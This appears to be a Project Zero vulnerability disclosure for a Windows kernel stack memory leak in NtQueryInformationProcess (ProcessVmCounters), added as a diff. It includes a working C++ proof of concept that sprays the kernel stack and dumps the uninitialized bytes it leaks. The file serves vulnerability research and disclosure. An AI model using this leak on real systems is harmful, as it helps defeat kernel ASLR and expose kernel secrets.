@@ -1,0 +1,148 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1190&desc=2
+
+We have discovered that the nt!NtQueryInformationProcess system call called with the ProcessVmCounters information class discloses portions of uninitialized kernel stack memory to user-mode clients, due to output structure alignment holes.
+
+On our test Windows 10 32-bit workstation, an example layout of the output buffer is as follows:
+
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000030: 00 00 00 00 ff ff ff ff 00 00 00 00 00 00 00 00 ................
+--- cut ---
+
+Where 00 denote bytes which are properly initialized, while ff indicate uninitialized values copied back to user-mode. The output data can be returned in a VM_COUNTERS_EX2 structure:
+
+--- cut ---
+typedef struct _VM_COUNTERS_EX {
+  SIZE_T PeakVirtualSize;
+  SIZE_T VirtualSize;
+  ULONG PageFaultCount;
+  SIZE_T PeakWorkingSetSize;
+  SIZE_T WorkingSetSize;
+  SIZE_T QuotaPeakPagedPoolUsage;
+  SIZE_T QuotaPagedPoolUsage;
+  SIZE_T QuotaPeakNonPagedPoolUsage;
+  SIZE_T QuotaNonPagedPoolUsage;
+  SIZE_T PagefileUsage;
+  SIZE_T PeakPagefileUsage;
+  SIZE_T PrivateUsage;
+} VM_COUNTERS_EX;
+
+typedef struct _VM_COUNTERS_EX2 {
+  VM_COUNTERS_EX CountersEx;
+  SIZE_T PrivateWorkingSetSize;
+  ULONGLONG SharedCommitUsage;
+} VM_COUNTERS_EX2, *PVM_COUNTERS_EX2;
+--- cut ---
+
+If we map the above shadow bytes to the structure definition, it turns out that the uninitialized bytes correspond to the alignment hole between the PrivateWorkingSetSize and SharedCommitUsage fields. The PrivateWorkingSetSize field ends at offset 0x34 of the structure, while SharedCommitUsage must be 8-byte aligned, causing a gap to be introduced at offsets 0x34-0x37, which is not initialized by the kernel prior to being copied back to the client application.
+
+The attached proof of concept code works by first filling a large portion of the kernel stack with a controlled marker byte 0x41 ('A') using the nt!NtMapUserPhysicalPages system call, and then invokes the affected nt!NtQueryInformationProcess syscall. As a result, we can observe that these leftover bytes are indeed leaked to user-mode at offset 0x34 of the output structure:
+
+--- cut ---
+00000000: 00 50 a8 00 00 50 a8 00 9b 01 00 00 00 00 19 00 .P...P..........
+00000010: 00 00 19 00 48 45 00 00 98 44 00 00 30 0a 00 00 ....HE...D..0...
+00000020: 00 05 00 00 00 d0 05 00 00 c0 06 00 00 d0 05 00 ................
+00000030: 00 30 02 00[41 41 41 41]00 30 05 00 00 00 00 00 .0..AAAA.0......
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <cstdio>
+
+#define ProcessVmCounters ((PROCESSINFOCLASS)3)
+
+typedef struct _VM_COUNTERS_EX {
+  SIZE_T PeakVirtualSize;
+  SIZE_T VirtualSize;
+  ULONG PageFaultCount;
+  SIZE_T PeakWorkingSetSize;
+  SIZE_T WorkingSetSize;
+  SIZE_T QuotaPeakPagedPoolUsage;
+  SIZE_T QuotaPagedPoolUsage;
+  SIZE_T QuotaPeakNonPagedPoolUsage;
+  SIZE_T QuotaNonPagedPoolUsage;
+  SIZE_T PagefileUsage;
+  SIZE_T PeakPagefileUsage;
+  SIZE_T PrivateUsage;
+} VM_COUNTERS_EX;
+
+typedef struct _VM_COUNTERS_EX2 {
+  VM_COUNTERS_EX CountersEx;
+  SIZE_T PrivateWorkingSetSize;
+  ULONGLONG SharedCommitUsage;
+} VM_COUNTERS_EX2, *PVM_COUNTERS_EX2;
+
+extern "C"
+ULONG WINAPI NtMapUserPhysicalPages(
+    PVOID BaseAddress,
+    ULONG NumberOfPages,
+    PULONG PageFrameNumbers
+);
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  // Buffer allocated in static program memory, hence doesn't touch the local stack.
+  static BYTE buffer[4096];
+
+  // Fill the buffer with 'A's and spray the kernel stack.
+  MyMemset(buffer, 'A', sizeof(buffer));
+  NtMapUserPhysicalPages(buffer, sizeof(buffer) / sizeof(DWORD), (PULONG)buffer);
+
+  // Make sure that we're really not touching any user-mode stack by overwriting the buffer with 'B's.
+  MyMemset(buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  VM_COUNTERS_EX2 counters;
+  ZeroMemory(&counters, sizeof(counters));
+
+  SprayKernelStack();
+
+  DWORD ReturnLength;
+  NTSTATUS st = NtQueryInformationProcess(GetCurrentProcess(), ProcessVmCounters, &counters, sizeof(counters), &ReturnLength);
+  if (!NT_SUCCESS(st)) {
+    printf("NtQueryInformationProcess failed, %x\n", st);
+    return 1;
+  }
+
+  PrintHex((PBYTE)&counters, ReturnLength);
+
+  return 0;
+}
